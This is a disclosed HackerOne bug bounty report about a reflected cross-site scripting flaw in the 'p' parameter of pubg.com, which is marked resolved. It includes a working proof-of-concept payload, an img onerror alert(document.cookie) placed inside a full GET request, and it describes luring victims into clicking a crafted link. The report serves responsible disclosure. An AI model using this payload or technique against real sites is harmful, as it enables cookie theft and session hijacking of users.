---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '751870'
original_report_id: '751870'
title: Reflected XSS in pubg.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: pubg
created_at: '2019-12-05T10:08:37.752Z'
disclosed_at: '2019-12-09T19:00:00.775Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 95
asset_identifier: '*.pubg.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in pubg.com

## Metadata

- HackerOne Report ID: 751870
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: pubg
- Disclosed At: 2019-12-09T19:00:00.775Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

PUBG's main website https://www.pubg.com has an endpoint that is vulnerable to an injection vulnerability - namely a reflected injection of JavaScript, also known as Reflected Cross Site Scripting (XSS). As per OWASP's definition: "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. "
This happens because one of the GET parameters "p" does not properly sanitize/escape user input, allowing an injection to occur.

## Steps To Reproduce:

To reproduce this, an attacker has to:

  * Prepare a Javascript payload that it wants the victim to execute. In this case, for Proof of Concept purposes, our Javascript code will prompt an alert showing the users' cookies.

```javascript
alert(document.cookie);
```

  * Inject this Javascript code properly into the vulnerable parameter, creating thus a crafted future GET request that will inject the payload.

```GETRequest
GET /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq HTTP/1.1
Host: www.pubg.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://www.pubg.com/es/feed/
Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us; wpml_browser_redirect_test=0; __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678
```
Request PoC {F651167}


  * As this injection happens in a GET parameter, the attacker simply needs to send the crafted Link that produces this GET request to the victim and have the victim click it.

Injection Demonstration {F651168}



## Supporting Material/References:

  * Video Demonstration

{F651177}

## Impact

With user interaction, an attacker could execute arbitrary Javascript code in a victim's browser.
This would allow an attacker to unwillingly make a victim:

* Perform any action in the identified endpoint
* View any information that the user is able to view
* Modify any information that the user is able to modify (not sure if applicable in this case)
* Interact with other application users as if it were him - impersonation (not sure if applicable in this case)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
